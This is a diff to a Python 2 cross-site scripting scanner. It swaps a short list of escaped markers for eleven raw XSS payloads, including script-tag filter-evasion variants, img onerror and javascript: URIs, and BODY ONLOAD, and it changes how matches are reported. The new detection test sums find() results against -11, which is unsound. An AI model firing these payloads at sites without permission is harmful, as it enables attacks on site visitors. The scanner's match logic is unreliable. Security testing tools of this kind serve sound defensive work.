@@ -6,11 +6,17 @@ from lxml.html import fromstring
 
 class Xss(object):
     def __init__(self, url):
-        self.comp = ["&gt;alert(",
-                     "&lt;ImG",
-                     "&lt;INPUT",
-                     "&lt;BODY"
-                     ]
+        self.comp = ["<ScrIpt>alert('XSSVVVV')</scRiPt>",
+                    "<sc<script>ript>alert('XSSVVVV')<</script>/script>",
+                    "<scscriPtript>alert('XSSVVVV')</scrscRiptipt>",
+                    "<ImG SRC=JaVaScRiPt:alert('XSSVVVV')",
+                    "<ImG \"\"\"><SCRIPT>alert(\"XSSVVVV\")</SCRIPT>\">",
+                    "<ImG src = XVVVV.jpg onerror=\"javascript:alert('XSSVVVV')\"/>",
+                    "<ImG DYNSRC=\"javascript:alert('XSSVVVV')\">",
+                    "</TITLE><SCRIPT>alert(\"XSSVVVV\");</SCRIPT>",
+                    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSSVVVV');\">",
+                    "<BODY ONLOAD=alert('XSSVVVV')>",
+                    "<BODY BACKGROUND=\"javascript:alert('XSSVVVV')\">"]
         self.url = url
         self.get = []
         self.post = []
@@ -34,8 +40,11 @@ class Xss(object):
                 if action not in links:
                     links[action] = {}
                 for field in fields.split("&"):
-                    name, value = field.split("=")
-                    links[action][name] = value
+                    try:
+                        name, value = field.split("=")
+                        links[action][name] = value
+                    except:
+                        pass
 
         for action in links:
             for field, value in links[action].iteritems():
@@ -60,33 +69,38 @@ class Xss(object):
         self.vectors = (len(self.get) + len(self.post)) / 11
 
     def scan(self):
-        print "Scanning " + str(self.vectors) + " vectors"
+        print "Scanning 11 *" + str(self.vectors) + " vectors"
 
         for request in self.get:
-            print "GET " + request
             try:
                 resp = self.opener.open(request).read()
-                self.print_match(resp)
+                a = self.print_match(resp)
+                if a==1:
+                    print "GET " + request
             except:
-                print "Error!"
+                pass
 
         for action, params in self.post:
-            print "POST " + action + "?" + params
             try:
                 req = urllib2.Request(action, params)
                 response = urllib2.urlopen(req)
                 resp = response.read()
-                self.print_match(resp)
+                a = self.print_match(resp)
+                if a==1:
+                    print "POST " + action
+                    print "Parameters " + params
             except:
-                print "Error!"
+                pass
 
     def print_match(self, resp):
         filtered = 0
         for checker in self.comp:
             filtered += resp.find(checker)
-        if (filtered == -4) & (resp.find("XSSVVVV") != -1):
+        if filtered != -11:
             self.success += 1
-            print "Found XSS Vulnerability..."
+            print "Found XSS Vulnerability on:"
+            return 1
+        return 0
 
 
 class execxss:
